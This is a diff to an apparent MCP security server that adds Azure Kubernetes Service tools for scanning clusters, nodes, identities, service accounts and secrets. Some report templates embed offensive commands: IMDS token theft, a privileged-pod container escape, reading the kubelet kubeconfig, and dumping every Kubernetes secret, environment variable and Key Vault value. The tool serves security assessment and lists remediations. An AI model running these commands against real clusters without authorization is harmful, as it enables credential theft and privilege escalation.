@@ -369,6 +369,24 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
         },
       },
       {
+        name: "scan_aks_clusters",
+        description: "Azure Kubernetes Service (AKS) security assessment. Checks: RBAC enabled, network policies configured, pod security policies, private cluster mode, Azure Policy integration, API server authorized IP ranges, Azure Active Directory integration. Returns Kubernetes-specific security findings.",
+        inputSchema: {
+          type: "object",
+          properties: {
+            subscriptionId: {
+              type: "string",
+              description: "Azure subscription ID",
+            },
+            resourceGroup: {
+              type: "string",
+              description: "Optional: Filter by specific resource group",
+            },
+          },
+          required: ["subscriptionId"],
+        },
+      },
+      {
         name: "scan_acr_security",
         description: "Azure Container Registry (ACR) security scanner. Checks: admin user enabled (high risk), public network access, vulnerability scanning enabled (Defender for Containers), content trust (image signing), network rules, anonymous pull access. Returns container security findings.",
         inputSchema: {
@@ -533,6 +551,50 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
         },
       },
       {
+        name: "enumerate_aks_identities",
+        description: "Enumerate AKS cluster identities and service principals. Returns: cluster managed identity, kubelet identity, service principal (if used), identity role assignments, Key Vault access, storage account permissions. OFFENSIVE USE: Identify privilege escalation paths from pod → managed identity → Azure resources.",
+        inputSchema: {
+          type: "object",
+          properties: {
+            subscriptionId: {
+              type: "string",
+              description: "Azure subscription ID",
+            },
+            resourceGroup: {
+              type: "string",
+              description: "Resource group name containing AKS cluster",
+            },
+            clusterName: {
+              type: "string",
+              description: "AKS cluster name",
+            },
+          },
+          required: ["subscriptionId", "resourceGroup", "clusterName"],
+        },
+      },
+      {
+        name: "scan_aks_node_security",
+        description: "Scan AKS node (VM) security configuration. Checks: OS disk encryption, SSH access enabled, public IPs on nodes, node pool configuration, auto-upgrade enabled, node security patches, privileged container capabilities. OFFENSIVE USE: Find vulnerable nodes for container escape, identify nodes with SSH access for lateral movement.",
+        inputSchema: {
+          type: "object",
+          properties: {
+            subscriptionId: {
+              type: "string",
+              description: "Azure subscription ID",
+            },
+            resourceGroup: {
+              type: "string",
+              description: "Resource group name containing AKS cluster",
+            },
+            clusterName: {
+              type: "string",
+              description: "AKS cluster name",
+            },
+          },
+          required: ["subscriptionId", "resourceGroup", "clusterName"],
+        },
+      },
+      {
         name: "scan_azure_devops",
         description: "Azure DevOps security scanner. Enumerates: organizations, projects, repositories, pipelines, service connections, variable groups, PAT tokens. Checks for: exposed secrets in repos, over-privileged service connections, insecure pipeline configurations, leaked credentials. OFFENSIVE USE: Find deployment credentials, API keys in source code, service principal secrets in pipelines.",
         inputSchema: {
@@ -661,6 +723,50 @@ server.setRequestHandler(ListToolsRequestSchema, async () => {
             },
           },
           required: ["subscriptionId"],
+        },
+      },
+      {
+        name: "scan_aks_service_accounts",
+        description: "Scan AKS cluster for service account security issues: default SA auto-mount enabled, SAs with cluster-wide permissions, Workload Identity not configured, SA impersonation allowed, legacy non-expiring tokens. Returns findings with MITRE ATT&CK mappings and remediation steps.",
+        inputSchema: {
+          type: "object",
+          properties: {
+            subscriptionId: {
+              type: "string",
+              description: "Azure subscription ID",
+            },
+            resourceGroup: {
+              type: "string",
+              description: "Resource group containing the AKS cluster",
+            },
+            clusterName: {
+              type: "string",
+              description: "AKS cluster name",
+            },
+          },
+          required: ["subscriptionId", "resourceGroup", "clusterName"],
+        },
+      },
+      {
+        name: "scan_aks_secrets",
+        description: "Scan for secrets in AKS cluster: enumerate K8s secrets, secrets in env vars, Azure Key Vault access, storage account credentials, ConfigMap secrets, mounted secret files, service principal credentials, container registry credentials. Returns extraction commands and remediation.",
+        inputSchema: {
+          type: "object",
+          properties: {
+            subscriptionId: {
+              type: "string",
+              description: "Azure subscription ID",
+            },
+            resourceGroup: {
+              type: "string",
+              description: "Resource group containing the AKS cluster",
+            },
+            clusterName: {
+              type: "string",
+              description: "AKS cluster name",
+            },
+          },
+          required: ["subscriptionId", "resourceGroup", "clusterName"],
         },
       },
       {
@@ -2577,6 +2683,98 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         };
       }
 
+      case "scan_aks_clusters": {
+        const { subscriptionId, resourceGroup } = request.params.arguments as {
+          subscriptionId: string;
+          resourceGroup?: string;
+        };
+
+        const containerClient = new ContainerServiceClient(credential, subscriptionId);
+        const clusters: any[] = [];
+
+        const aksClusters = resourceGroup
+          ? containerClient.managedClusters.listByResourceGroup(resourceGroup)
+          : containerClient.managedClusters.list();
+
+        for await (const cluster of aksClusters) {
+          const clusterFindings: any[] = [];
+          let riskScore = 0;
+
+          // Check RBAC
+          if (!cluster.enableRbac) {
+            clusterFindings.push({
+              severity: "CRITICAL",
+              finding: "Kubernetes RBAC is DISABLED",
+              description: "No role-based access control for Kubernetes resources",
+              remediation: "Enable RBAC for proper access control",
+              cve: "CWE-284: Improper Access Control",
+            });
+            riskScore += 60;
+          }
+
+          // Check network policy
+          if (!cluster.networkProfile?.networkPolicy) {
+            clusterFindings.push({
+              severity: "HIGH",
+              finding: "Network policies NOT configured",
+              description: "No network segmentation between pods",
+              remediation: "Enable network policy (Azure CNI or Calico)",
+              cve: "CWE-923: Improper Restriction of Communication Channel",
+            });
+            riskScore += 40;
+          }
+
+          // Check private cluster
+          if (!cluster.apiServerAccessProfile?.enablePrivateCluster) {
+            clusterFindings.push({
+              severity: "HIGH",
+              finding: "NOT a private cluster",
+              description: "Kubernetes API server has public endpoint",
+              remediation: "Enable private cluster mode",
+              cve: "CWE-668: Exposure of Resource to Wrong Sphere",
+            });
+            riskScore += 35;
+          }
+
+          // Check Azure AD integration
+          if (!cluster.aadProfile?.managed) {
+            clusterFindings.push({
+              severity: "MEDIUM",
+              finding: "Azure AD integration NOT enabled",
+              description: "Not using Azure AD for Kubernetes authentication",
+              remediation: "Enable Azure AD managed integration",
+              cve: "CWE-287: Improper Authentication",
+            });
+            riskScore += 15;
+          }
+
+          clusters.push({
+            name: cluster.name,
+            resourceGroup: cluster.id?.split('/')[4],
+            location: cluster.location,
+            kubernetesVersion: cluster.kubernetesVersion,
+            rbacEnabled: cluster.enableRbac,
+            networkPolicy: cluster.networkProfile?.networkPolicy,
+            privateCluster: cluster.apiServerAccessProfile?.enablePrivateCluster,
+            azureAdEnabled: cluster.aadProfile?.managed,
+            riskScore,
+            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
+            findings: clusterFindings,
+          });
+        }
+
+        clusters.sort((a, b) => b.riskScore - a.riskScore);
+
+        return {
+          content: [
+            {
+              type: "text",
+              text: `# AKS Cluster Security Analysis\n\n## Summary\n- Total AKS Clusters: ${clusters.length}\n- CRITICAL Risk: ${clusters.filter(c => c.riskLevel === "CRITICAL").length}\n- HIGH Risk: ${clusters.filter(c => c.riskLevel === "HIGH").length}\n- MEDIUM Risk: ${clusters.filter(c => c.riskLevel === "MEDIUM").length}\n\n## Detailed Findings\n\n${JSON.stringify(clusters, null, 2)}`,
+            },
+          ],
+        };
+      }
+
       case "scan_acr_security": {
         const { subscriptionId, resourceGroup } = request.params.arguments as {
           subscriptionId: string;
@@ -3736,6 +3934,290 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         }
       }
 
+      case "enumerate_aks_identities": {
+        const { subscriptionId, resourceGroup, clusterName } = request.params.arguments as {
+          subscriptionId: string;
+          resourceGroup: string;
+          clusterName: string;
+        };
+
+        const containerClient = new ContainerServiceClient(credential, subscriptionId);
+        const authClient = new AuthorizationManagementClient(credential, subscriptionId);
+        
+        try {
+          const cluster = await containerClient.managedClusters.get(resourceGroup, clusterName);
+          
+          let report = `# AKS Identity Enumeration - ${clusterName}\n\n`;
+          
+          // Cluster Identity
+          report += `## Cluster Identity\n`;
+          if (cluster.identity?.type === "SystemAssigned") {
+            report += `- **Type:** System-Assigned Managed Identity\n`;
+            report += `- **Principal ID:** ${cluster.identity.principalId}\n`;
+            report += `- **Tenant ID:** ${cluster.identity.tenantId}\n\n`;
+            
+            // Get role assignments for this identity
+            report += `### Role Assignments\n`;
+            try {
+              const roleAssignments = authClient.roleAssignments.listForScope(
+                `/subscriptions/${subscriptionId}`
+              );
+              
+              for await (const assignment of roleAssignments) {
+                if (assignment.principalId === cluster.identity.principalId) {
+                  report += `- **Scope:** ${assignment.scope}\n`;
+                  report += `  **Role:** ${assignment.roleDefinitionId?.split('/').pop()}\n\n`;
+                }
+              }
+            } catch (e: any) {
+              report += `*Unable to enumerate role assignments: ${e.message}*\n\n`;
+            }
+          } else if (cluster.identity?.type === "UserAssigned") {
+            report += `- **Type:** User-Assigned Managed Identity\n`;
+            const identities = cluster.identity.userAssignedIdentities || {};
+            for (const [identityId, identityInfo] of Object.entries(identities)) {
+              report += `- **Identity Resource:** ${identityId}\n`;
+              report += `  **Principal ID:** ${(identityInfo as any).principalId}\n`;
+              report += `  **Client ID:** ${(identityInfo as any).clientId}\n\n`;
+            }
+          } else {
+            report += `- **Type:** None (using Service Principal)\n\n`;
+          }
+          
+          // Service Principal (if used)
+          if (cluster.servicePrincipalProfile?.clientId) {
+            report += `## Service Principal\n`;
+            report += `- **Client ID:** ${cluster.servicePrincipalProfile.clientId}\n`;
+            if (cluster.servicePrincipalProfile.clientId === "msi") {
+              report += `- **Type:** Managed Service Identity (MSI)\n\n`;
+            } else {
+              report += `- **Type:** Standard Service Principal\n`;
+              report += `- [WARN] **Security Risk:** Service principals use secrets that can be stolen\n\n`;
+            }
+          }
+          
+          // Kubelet Identity
+          if (cluster.identityProfile?.kubeletidentity) {
+            report += `## Kubelet Identity\n`;
+            report += `- **Resource ID:** ${cluster.identityProfile.kubeletidentity.resourceId}\n`;
+            report += `- **Client ID:** ${cluster.identityProfile.kubeletidentity.clientId}\n`;
+            report += `- **Object ID:** ${cluster.identityProfile.kubeletidentity.objectId}\n\n`;
+          }
+          
+          // Add-on identities
+          if (cluster.addonProfiles) {
+            report += `## Add-on Identities\n`;
+            for (const [addonName, addonProfile] of Object.entries(cluster.addonProfiles)) {
+              if ((addonProfile as any).identity) {
+                report += `### ${addonName}\n`;
+                report += `- **Resource ID:** ${(addonProfile as any).identity.resourceId}\n`;
+                report += `- **Client ID:** ${(addonProfile as any).identity.clientId}\n`;
+                report += `- **Object ID:** ${(addonProfile as any).identity.objectId}\n\n`;
+              }
+            }
+          }
+          
+          report += `## Attack Surface Analysis\n\n`;
+          report += `### IMDS Exploitation Risk\n`;
+          report += `If pods can access Azure IMDS (169.254.169.254), they can:\n`;
+          report += `1. Retrieve managed identity access tokens\n`;
+          report += `2. Use tokens to access Azure resources (based on identity's RBAC)\n`;
+          report += `3. Bypass Kubernetes RBAC entirely\n\n`;
+          
+          report += `### Test IMDS Access from Pod\n\`\`\`bash\n`;
+          report += `# Deploy test pod\n`;
+          report += `kubectl run imds-test --image=alpine --restart=Never --rm -it -- /bin/sh\n\n`;
+          report += `# Inside pod:\n`;
+          report += `apk add curl jq\n`;
+          report += `TOKEN=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token)\n`;
+          report += `echo $TOKEN\n\n`;
+          report += `# Use token to list subscriptions\n`;
+          report += `curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq\n\`\`\`\n\n`;
+          
+          report += `### Privilege Escalation Paths\n`;
+          if (cluster.identity?.principalId) {
+            report += `- If cluster identity has **Contributor** or **Owner** on subscription → Full Azure control from pods\n`;
+            report += `- If kubelet identity has access to **Key Vault** → Extract secrets from pods\n`;
+            report += `- If identity has **Storage Blob Data Contributor** → Read/Write storage from pods\n\n`;
+          }
+          
+          report += `## Remediation\n`;
+          report += `1. Use **AAD Pod Identity** or **Workload Identity** instead of cluster-wide managed identity\n`;
+          report += `2. Block IMDS from pods using network policies or iptables\n`;
+          report += `3. Implement **least privilege RBAC** for identities\n`;
+          report += `4. Enable **Azure Policy** to restrict pod capabilities\n`;
+          report += `5. Use **Pod Security Policies** or **Pod Security Standards**\n`;
+
+          return {
+            content: [{ type: "text", text: report }],
+          };
+        } catch (error: any) {
+          return {
+            content: [{
+              type: "text",
+              text: `Error enumerating AKS identities: ${error.message}`
+            }],
+            isError: true,
+          };
+        }
+      }
+
+      case "scan_aks_node_security": {
+        const { subscriptionId, resourceGroup, clusterName } = request.params.arguments as {
+          subscriptionId: string;
+          resourceGroup: string;
+          clusterName: string;
+        };
+
+        const containerClient = new ContainerServiceClient(credential, subscriptionId);
+        const computeClient = new ComputeManagementClient(credential, subscriptionId);
+        
+        try {
+          const cluster = await containerClient.managedClusters.get(resourceGroup, clusterName);
+          
+          let report = `# AKS Node Security Scan - ${clusterName}\n\n`;
+          
+          // Get node resource group (where actual VMs are)
+          const nodeResourceGroup = cluster.nodeResourceGroup || "";
+          report += `## Node Resource Group\n`;
+          report += `- **Name:** ${nodeResourceGroup}\n`;
+          report += `- **Location:** ${cluster.location}\n\n`;
+          
+          // Analyze agent pools
+          report += `## Node Pools\n\n`;
+          const agentPools = cluster.agentPoolProfiles || [];
+          
+          for (const pool of agentPools) {
+            report += `### ${pool.name}\n`;
+            report += `- **VM Size:** ${pool.vmSize}\n`;
+            report += `- **OS Type:** ${pool.osType}\n`;
+            report += `- **OS SKU:** ${pool.osSKU}\n`;
+            report += `- **Node Count:** ${pool.count}\n`;
+            report += `- **Mode:** ${pool.mode}\n`;
+            report += `- **Availability Zones:** ${pool.availabilityZones?.join(", ") || "None"}\n\n`;
+            
+            // Security findings
+            report += `**Security Findings:**\n`;
+            
+            // Check OS disk encryption
+            if (!pool.enableEncryptionAtHost) {
+              report += `- [FAIL] **HIGH:** Host encryption NOT enabled - OS and temp disks not encrypted at rest\n`;
+            } else {
+              report += `- [OK] Host encryption enabled\n`;
+            }
+            
+            // Check FIPS
+            if (!pool.enableFips) {
+              report += `- [WARN] **MEDIUM:** FIPS not enabled (required for compliance workloads)\n`;
+            }
+            
+            // Check auto-upgrade
+            if (pool.enableAutoScaling) {
+              report += `- [OK] Auto-scaling enabled (${pool.minCount}-${pool.maxCount} nodes)\n`;
+            } else {
+              report += `- [WARN] **MEDIUM:** Auto-scaling disabled - manual scaling required\n`;
+            }
+            
+            // Check ultra SSD
+            if (pool.enableUltraSSD) {
+              report += `- [INFO] Ultra SSD enabled\n`;
+            }
+            
+            // Check node public IP
+            if (pool.enableNodePublicIP) {
+              report += `- [FAIL] **CRITICAL:** Nodes have PUBLIC IPs - direct Internet exposure\n`;
+            } else {
+              report += `- [OK] Nodes do not have public IPs\n`;
+            }
+            
+            report += `\n`;
+          }
+          
+          // Try to enumerate actual VMs in node resource group
+          report += `## Node Virtual Machines\n\n`;
+          try {
+            const vms = computeClient.virtualMachines.list(nodeResourceGroup);
+            let vmCount = 0;
+            
+            for await (const vm of vms) {
+              vmCount++;
+              report += `### VM: ${vm.name}\n`;
+              
+              // Check VM encryption
+              if (vm.storageProfile?.osDisk?.encryptionSettings?.enabled) {
+                report += `- [OK] OS Disk encrypted\n`;
+              } else {
+                report += `- [FAIL] **HIGH:** OS Disk NOT encrypted\n`;
+              }
+              
+              // Check data disks
+              const dataDisks = vm.storageProfile?.dataDisks || [];
+              if (dataDisks.length > 0) {
+                report += `- **Data Disks:** ${dataDisks.length}\n`;
+                for (const disk of dataDisks) {
+                  // Note: Disk encryption checked at disk resource level, not here
+                  report += `  - ${disk.name} (${disk.diskSizeGB} GB)\n`;
+                }
+              }
+              
+              // Check VM extensions (security agents)
+              if (vm.resources) {
+                report += `- **Extensions:**\n`;
+                for (const ext of vm.resources) {
+                  report += `  - ${ext.type}: ${ext.name}\n`;
+                }
+              }
+              
+              report += `\n`;
+            }
+            
+            if (vmCount === 0) {
+              report += `*No VMs found or insufficient permissions*\n\n`;
+            }
+          } catch (e: any) {
+            report += `*Unable to enumerate VMs: ${e.message}*\n\n`;
+          }
+          
+          report += `## Attack Surface\n\n`;
+          report += `### Container Escape Risk\n`;
+          report += `If nodes lack proper security configuration:\n`;
+          report += `1. Deploy privileged pod: \`kubectl run priv --image=alpine --restart=Never --overrides='{"spec":{"containers":[{"name":"priv","image":"alpine","securityContext":{"privileged":true}}],"hostNetwork":true,"hostPID":true}}' --rm -it -- /bin/sh\`\n`;
+          report += `2. From privileged pod, access host filesystem: \`mount /dev/sda1 /mnt && chroot /mnt\`\n`;
+          report += `3. Now on AKS node with root access\n`;
+          report += `4. Read kubelet config: \`cat /var/lib/kubelet/kubeconfig\`\n`;
+          report += `5. Access all cluster secrets and resources\n\n`;
+          
+          report += `### SSH Access (if enabled)\n`;
+          report += `Some organizations enable SSH on AKS nodes for troubleshooting:\n`;
+          report += `\`\`\`bash\n`;
+          report += `# Find node IPs\n`;
+          report += `kubectl get nodes -o wide\n\n`;
+          report += `# Attempt SSH (if enabled and you have private key)\n`;
+          report += `ssh azureuser@<NODE_IP>\n`;
+          report += `\`\`\`\n\n`;
+          
+          report += `## Remediation\n`;
+          report += `1. Enable **encryption at host** for all node pools\n`;
+          report += `2. Disable **node public IPs** (use private cluster)\n`;
+          report += `3. Implement **Pod Security Standards** to prevent privileged pods\n`;
+          report += `4. Enable **auto-upgrade** for security patches\n`;
+          report += `5. Use **Azure Defender for Containers** for runtime protection\n`;
+          report += `6. Disable SSH access to nodes\n`;
+
+          return {
+            content: [{ type: "text", text: report }],
+          };
+        } catch (error: any) {
+          return {
+            content: [{
+              type: "text",
+              text: `Error scanning AKS nodes: ${error.message}`
+            }],
+            isError: true,
+          };
+        }
+      }
+
       case "scan_azure_devops": {
         const { organizationUrl, personalAccessToken, scanRepositories, scanPipelines } = request.params.arguments as {
           organizationUrl: string;
@@ -4346,6 +4828,375 @@ generate_security_report subscriptionId="SUB" format="csv" outputFile="C:\\\\fin
         } catch (error: any) {
           return {
             content: [{ type: 'text', text: `Error detecting persistence: ${error.message}` }],
+            isError: true,
+          };
+        }
+      }
+
+      case "scan_aks_service_accounts": {
+        const { subscriptionId, resourceGroup, clusterName } = request.params.arguments as {
+          subscriptionId: string;
+          resourceGroup: string;
+          clusterName: string;
+        };
+
+        try {
+          const containerClient = new ContainerServiceClient(credential, subscriptionId);
+          const cluster = await containerClient.managedClusters.get(resourceGroup, clusterName);
+          
+          const findings: any[] = [];
+          let riskScore = 0;
+
+          // TC-AKSSA-001: Check if Workload Identity is enabled
+          if (!cluster.securityProfile?.workloadIdentity?.enabled) {
+            findings.push({
+              id: 'TC-AKSSA-001',
+              severity: 'HIGH',
+              name: 'Azure Workload Identity Not Configured',
+              description: 'Pods may be using IMDS to get managed identity tokens instead of Workload Identity',
+              mitre: 'T1552.005 - Cloud Instance Metadata API',
+              test: 'kubectl get sa -A -o json | jq -r \'.items[] | select(.metadata.annotations["azure.workload.identity/client-id"] == null) | "\\(.metadata.namespace)/\\(.metadata.name)"\'',
+              remediation: 'Enable Workload Identity: az aks update -g <rg> -n <cluster> --enable-oidc-issuer --enable-workload-identity',
+              payload: 'curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"',
+            });
+            riskScore += 35;
+          }
+
+          // TC-AKSSA-002: Check Azure AD integration
+          if (!cluster.aadProfile?.managed) {
+            findings.push({
+              id: 'TC-AKSSA-002',
+              severity: 'MEDIUM',
+              name: 'Azure AD Integration Not Enabled',
+              description: 'Cluster not using Azure AD for authentication, may rely on client certificates',
+              mitre: 'T1078.004 - Valid Accounts: Cloud Accounts',
+              test: 'az aks show -g <rg> -n <cluster> --query "aadProfile"',
+              remediation: 'az aks update -g <rg> -n <cluster> --enable-aad --aad-admin-group-object-ids <group-id>',
+              payload: null,
+            });
+            riskScore += 20;
+          }
+
+          // TC-AKSSA-003: Check OIDC issuer for federated identity
+          if (!cluster.oidcIssuerProfile?.enabled) {
+            findings.push({
+              id: 'TC-AKSSA-003',
+              severity: 'HIGH',
+              name: 'OIDC Issuer Not Enabled',
+              description: 'Cannot use federated identity credentials for service accounts',
+              mitre: 'T1528 - Steal Application Access Token',
+              test: 'az aks show -g <rg> -n <cluster> --query "oidcIssuerProfile"',
+              remediation: 'az aks update -g <rg> -n <cluster> --enable-oidc-issuer',
+              payload: null,
+            });
+            riskScore += 25;
+          }
+
+          // Generate kubectl commands for further SA analysis
+          const saAnalysisCommands = `
+## Service Account Security Analysis Commands
+
+### 1. Find pods using default service account
+\`\`\`bash
+kubectl get pods -A -o json | jq -r '.items[] | select(.spec.serviceAccountName == "default" or .spec.serviceAccountName == null) | "\\(.metadata.namespace)/\\(.metadata.name)"'
+\`\`\`
+
+### 2. Find ClusterRoleBindings for service accounts
+\`\`\`bash
+kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.subjects[]?.kind == "ServiceAccount") | "\\(.metadata.name): \\(.subjects[].namespace)/\\(.subjects[].name) -> \\(.roleRef.name)"'
+\`\`\`
+
+### 3. Find SAs with cluster-admin role
+\`\`\`bash
+kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name == "cluster-admin") | select(.subjects[]?.kind == "ServiceAccount") | .subjects[] | select(.kind == "ServiceAccount") | "\\(.namespace)/\\(.name)"'
+\`\`\`
+
+### 4. Check SA impersonation permissions
+\`\`\`bash
+kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.verbs[]? == "impersonate") | .metadata.name'
+\`\`\`
+
+### 5. Find legacy SA token secrets
+\`\`\`bash
+kubectl get secrets -A -o json | jq -r '.items[] | select(.type == "kubernetes.io/service-account-token") | "\\(.metadata.namespace)/\\(.metadata.name)"'
+\`\`\`
+
+### 6. Check automountServiceAccountToken on default SA
+\`\`\`bash
+kubectl get sa default -o yaml | grep -A5 automountServiceAccountToken
+\`\`\`
+`;
+
+          const report = `# AKS Service Account Security Analysis
+
+## Cluster: ${clusterName}
+**Resource Group:** ${resourceGroup}
+**Subscription:** ${subscriptionId}
+**Kubernetes Version:** ${cluster.kubernetesVersion}
+**Scan Time:** ${new Date().toISOString()}
+
+## Risk Assessment
+- **Risk Score:** ${riskScore}/100
+- **Risk Level:** ${riskScore >= 50 ? 'CRITICAL' : riskScore >= 30 ? 'HIGH' : riskScore >= 15 ? 'MEDIUM' : 'LOW'}
+- **Findings:** ${findings.length}
+
+## Cluster Security Configuration
+| Setting | Status |
+|---------|--------|
+| Workload Identity | ${cluster.securityProfile?.workloadIdentity?.enabled ? '[OK] Enabled' : '[FAIL] Disabled'} |
+| OIDC Issuer | ${cluster.oidcIssuerProfile?.enabled ? '[OK] Enabled' : '[FAIL] Disabled'} |
+| Azure AD Integration | ${cluster.aadProfile?.managed ? '[OK] Enabled' : '[FAIL] Disabled'} |
+| Pod Identity (Legacy) | ${cluster.podIdentityProfile?.enabled ? '[WARN] Legacy' : '[-] Not Used'} |
+| Private Cluster | ${cluster.apiServerAccessProfile?.enablePrivateCluster ? '[OK] Yes' : '[FAIL] No'} |
+
+## Findings
+
+${findings.map(f => `### ${f.id}: ${f.name}
+**Severity:** ${f.severity}
+**MITRE ATT&CK:** ${f.mitre}
+
+${f.description}
+
+**Detection:**
+\`\`\`bash
+${f.test}
+\`\`\`
+
+**Remediation:**
+\`\`\`bash
+${f.remediation}
+\`\`\`
+
+${f.payload ? `**Exploitation:**
+\`\`\`bash
+${f.payload}
+\`\`\`` : ''}
+`).join('\n---\n\n')}
+
+${saAnalysisCommands}`;
+
+          return {
+            content: [{ type: 'text', text: report }],
+          };
+        } catch (error: any) {
+          return {
+            content: [{ type: 'text', text: `Error scanning AKS service accounts: ${error.message}` }],
+            isError: true,
+          };
+        }
+      }
+
+      case "scan_aks_secrets": {
+        const { subscriptionId, resourceGroup, clusterName } = request.params.arguments as {
+          subscriptionId: string;
+          resourceGroup: string;
+          clusterName: string;
+        };
+
+        try {
+          const containerClient = new ContainerServiceClient(credential, subscriptionId);
+          const cluster = await containerClient.managedClusters.get(resourceGroup, clusterName);
+          
+          // Check for Key Vault CSI driver
+          const kvCsiEnabled = cluster.addonProfiles?.azureKeyvaultSecretsProvider?.enabled || false;
+          
+          const report = `# AKS Secret Hunting Guide
+
+## Cluster: ${clusterName}
+**Resource Group:** ${resourceGroup}
+**Subscription:** ${subscriptionId}
+**Kubernetes Version:** ${cluster.kubernetesVersion}
+**Scan Time:** ${new Date().toISOString()}
+
+## Cluster Secret Configuration
+| Feature | Status |
+|---------|--------|
+| Key Vault CSI Driver | ${kvCsiEnabled ? '[OK] Enabled' : '[FAIL] Disabled'} |
+| Azure AD Integration | ${cluster.aadProfile?.managed ? '[OK] Enabled' : '[FAIL] Disabled'} |
+| Workload Identity | ${cluster.securityProfile?.workloadIdentity?.enabled ? '[OK] Enabled' : '[FAIL] Disabled'} |
+| Disk Encryption | ${cluster.diskEncryptionSetID ? '[OK] Enabled' : '[FAIL] Default'} |
+
+---
+
+## Secret Hunting Commands
+
+### 1. Enumerate All Kubernetes Secrets (TC-AKSSEC-001)
+**Risk:** CRITICAL | **MITRE:** T1552.001 - Credentials In Files
+
+\`\`\`bash
+# List all secrets
+kubectl get secrets -A
+
+# Get secret type distribution
+kubectl get secrets -A -o json | jq -r '.items[] | .type' | sort | uniq -c
+
+# Find interesting secrets by name
+kubectl get secrets -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name): \\(.type)"' | grep -iE "password|token|key|cred|secret|api|db|azure|storage"
+
+# Dump all secrets (DANGEROUS)
+kubectl get secrets -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name):\\n\\(.data | to_entries[] | "  \\(.key): \\(.value | @base64d)")"'
+\`\`\`
+
+---
+
+### 2. Secrets in Environment Variables (TC-AKSSEC-002)
+**Risk:** HIGH | **MITRE:** T1552.001 - Credentials In Files
+
+\`\`\`bash
+# Find pods with secrets in env vars
+kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[].env[]?.valueFrom.secretKeyRef != null) | "\\(.metadata.namespace)/\\(.metadata.name)"'
+
+# Get details of secret references
+kubectl get pods -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name):" as \\$pod | .spec.containers[] | .env[]? | select(.valueFrom.secretKeyRef != null) | "\\(\\$pod) \\(.name)=\\(.valueFrom.secretKeyRef.name)/\\(.valueFrom.secretKeyRef.key)"'
+
+# From compromised pod - read env vars
+env | grep -iE "password|secret|token|key|azure|storage"
+cat /proc/1/environ | tr '\\0' '\\n' | grep -iE "password|secret|token"
+\`\`\`
+
+---
+
+### 3. Azure Key Vault Secrets (TC-AKSSEC-003)
+**Risk:** HIGH | **MITRE:** T1552.005 - Cloud Instance Metadata API
+**Key Vault CSI Status:** ${kvCsiEnabled ? '[OK] Enabled - Check SecretProviderClass' : '[FAIL] Disabled - May use IMDS'}
+
+\`\`\`bash
+# Find SecretProviderClass resources
+kubectl get secretproviderclass -A -o yaml
+
+# Extract vault names
+kubectl get secretproviderclass -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name): \\(.spec.parameters.keyvaultName)"'
+
+# Get token via IMDS (if not using Workload Identity)
+TOKEN=\\$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq -r .access_token)
+
+# List secrets in vault
+VAULT="<vault-name>"
+curl -s -H "Authorization: Bearer \\$TOKEN" "https://\\$VAULT.vault.azure.net/secrets?api-version=7.3"
+
+# Get secret value
+curl -s -H "Authorization: Bearer \\$TOKEN" "https://\\$VAULT.vault.azure.net/secrets/<secret-name>?api-version=7.3" | jq -r .value
+\`\`\`
+
+---
+
+### 4. Azure Storage Account Credentials (TC-AKSSEC-004)
+**Risk:** HIGH | **MITRE:** T1552.001 - Credentials In Files
+
+\`\`\`bash
+# Find storage secrets in K8s
+kubectl get secrets -A -o json | jq -r '.items[] | select(.data | keys[] | test("storage|connection|sas"; "i")) | "\\(.metadata.namespace)/\\(.metadata.name)"'
+
+# Extract Azure Files secrets
+kubectl get secrets -A -o json | jq -r '.items[] | select(.data.azurestorageaccountkey != null) | "\\(.metadata.namespace)/\\(.metadata.name): \\(.data.azurestorageaccountname | @base64d) / \\(.data.azurestorageaccountkey | @base64d)"'
+
+# Find PVs using Azure storage
+kubectl get pv -o json | jq -r '.items[] | select(.spec.azureFile != null or .spec.azureDisk != null) | "\\(.metadata.name): \\(.spec.azureFile.secretName // .spec.azureDisk)"'
+
+# Use identity to get storage keys
+az storage account keys list -n <storage> --query '[0].value' -o tsv
+\`\`\`
+
+---
+
+### 5. Secrets in ConfigMaps (TC-AKSSEC-005)
+**Risk:** HIGH | **MITRE:** T1552.001 - Credentials In Files
+
+\`\`\`bash
+# Search ConfigMaps for sensitive keywords
+kubectl get configmaps -A -o json | jq -r '.items[] | "\\(.metadata.namespace)/\\(.metadata.name):\\n\\(.data // {} | to_entries[] | "  \\(.key)")"' | grep -iE "password|secret|token|key|credential|connection"
+
+# Find Azure connection strings
+kubectl get configmaps -A -o json | jq -r '.items[].data | to_entries[]? | .value' | grep -iE "AccountKey=|SharedAccessSignature=|Server=.*Password="
+\`\`\`
+
+---
+
+### 6. Mounted Secret Files (TC-AKSSEC-006)
+**Risk:** HIGH | **MITRE:** T1552.001 - Credentials In Files
+
+\`\`\`bash
+# Find pods with secret volume mounts
+kubectl get pods -A -o json | jq -r '.items[] | select(.spec.volumes[]?.secret != null) | "\\(.metadata.namespace)/\\(.metadata.name): \\([.spec.volumes[] | select(.secret != null) | .secret.secretName] | join(", "))"'
+
+# From compromised pod - find secrets
+find / -type f \\( -name "*.key" -o -name "*.pem" -o -name "*secret*" -o -name "*credential*" \\) 2>/dev/null | xargs cat
+
+# Common paths
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+cat /mnt/secrets-store/*
+find / -name "azure.json" 2>/dev/null | xargs cat
